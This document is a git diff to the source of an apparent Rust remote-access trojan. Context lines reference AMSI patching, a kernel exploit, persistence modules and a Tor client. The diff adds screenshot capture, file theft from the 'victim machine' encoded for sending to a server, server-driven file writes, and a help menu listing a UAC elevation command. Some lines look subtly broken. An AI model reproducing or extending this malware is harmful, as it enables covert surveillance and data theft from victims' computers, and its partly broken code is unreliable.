@@ -6,7 +6,6 @@ mod amsi_patch;
 mod kernel_exploit;
 #[cfg(target_os = "windows")]
 mod persist;
-
 #[cfg(target_os = "windows")]
 use is_elevated::is_elevated;
 
@@ -19,9 +18,10 @@ use anyhow::{Result, anyhow};
 use gethostname::gethostname;
 use tokio::time::{sleep, Duration};
 use rand::Rng;
-use std::env;
-use anyhow::{Error};
-
+use std::fs;
+use std::path::{Path, Prefix};
+use base64::{engine::general_purpose, Engine as _};
+use screenshots::Screen;
 
 
 #[cfg(target_os = "windows")]
@@ -59,6 +59,18 @@ async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
     Ok(client)
 }
 
+fn take_screenshot_base64() -> anyhow::Result<String> {
+    let screens = Screen::all()?;
+    let screen = &screens[0];
+
+    let image = screen.capture()?;
+
+    let mut buf = Vec::new();
+    image.write_to(&mut buf, image::ImageOutputFormat::Png)?;
+
+    Ok(general_purpose::STANDARD.encode(buf)())
+}
+
 /// Build prompt string
 pub fn build_prompt() -> String {
     let user = std::env::var("USER")
@@ -76,6 +88,7 @@ pub fn build_prompt() -> String {
     format!("{}@{} [{}] >> ", user, host, cwd)
 }
 
+
 /// Execute a command
 pub async fn run_command(input: &str) -> Result<Vec<u8>> {
     let mut parts = input.trim().split_whitespace();
@@ -84,6 +97,70 @@ pub async fn run_command(input: &str) -> Result<Vec<u8>> {
     let args: Vec<&str> = parts.collect();
 
     match cmd {
+        "help" | "/h"|"/?" |"" => {
+            Ok(format!("
+
+Available commands:
+    `cd [directory]`=>\t Change Directory to [directory]
+    `screenshot`=>\tTake screenshot from vicim machine
+    `upload [filename]`=>\tUpload file to the server
+    `download [filename]`=>\tDownload file from the server
+    `uac [exe_path]`=>\tRun elevated command on Windows
+
+    ").into_bytes())
+        }
+        "screenshot" => {
+            let filename = args
+                .get(0)
+                .ok_or_else(|| anyhow!("Missing filename"))?;
+
+            if filename.into_string() == ""{
+                let encoded = take_screenshot_base64()?;
+                Ok(format!("[file] screenshot.png {}", encoded).into_bytes())
+            }else{
+                let encoded = take_screenshot_base64()?;
+                Ok(format!("[file] {} {}",filename.into_string(), encoded).into_bytes())
+            }
+        }
+        "upload" => {
+            let input_filename = args
+                .get(0)
+                .ok_or_else(|| anyhow!("upload: missing filename"))?;
+
+            let path = Path::new(input_filename);
+
+            let data = fs::read(path)?;
+
+            let filename = path
+                .file_name()
+                .and_then(|f| f.to_str())
+                .ok_or_else(|| anyhow!("invalid filename"))?;
+
+            Ok(format!(
+                "[file] {} {}",
+                filename,
+                general_purpose::STANDARD.encode(&data)
+            )
+            .into_bytes())
+        }
+        "download" | "[file][" => {
+            
+            let input_filename = args
+                .get(0)
+                .ok_or_else(|| anyhow!("download: missing filename"))?;
+
+            let encoded = args
+                .get(1)
+                .ok_or_else(|| anyhow!("download: missing data"))?;
+
+            let data = general_purpose::STANDARD.decode(encoded)?;
+
+            let path = Path::new(input_filename);
+
+            fs::write(path, &data)?;
+
+            Ok(format!("Wrote data to {}", input_filename).into_bytes())
+        }
         "cd" => {
             let target = args.get(0).ok_or_else(|| anyhow!("cd: missing argument"))?;
 
